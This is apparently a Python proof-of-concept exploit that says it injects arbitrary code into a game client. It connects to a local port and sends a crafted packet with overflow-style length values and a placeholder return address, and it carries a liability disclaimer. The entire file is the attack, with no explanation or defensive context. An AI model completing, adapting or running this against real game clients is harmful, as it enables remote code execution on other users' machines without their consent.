"""This code will inject arbitrary code into a client's game.

You are fully responsible for all activity that occurs while using this code.
The author of this code can not be held liable to you or to anyone else as a
result of damages caused by the usage of this code.
"""

__author__ = 'MikeIsAStar'
__date__ = '26 Jun 2024'

import socket
import sys

if sys.version_info < (3, 6):
    sys.exit('This program requires Python 3.6 or above !')


# Variables
TARGET_HOST = 'localhost'
TARGET_PORT = 46318
RETURN_ADDRESS = b'\x41\x41\x41\x41'
assert(len(RETURN_ADDRESS) == 0x04)


def main():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as socket_object:
            socket_object.connect((TARGET_HOST, TARGET_PORT))
            socket_object.sendall(b'\x02\x00\x00\x00' + b'\xC1\x53\xE9\xFF' +
                                  b'\x1C\x00\x00\x00' + b'\x98\xF9\xFF\xFF' + RETURN_ADDRESS)
            socket_object.recv(0xA8, socket.MSG_WAITALL)
        print(f"Successfully sent the data to the address '{TARGET_HOST}:{TARGET_PORT}' !")
    except BaseException:
        print(f"Failed to send the data to the address '{TARGET_HOST}:{TARGET_PORT}' !")


if __name__ == '__main__':
    main()
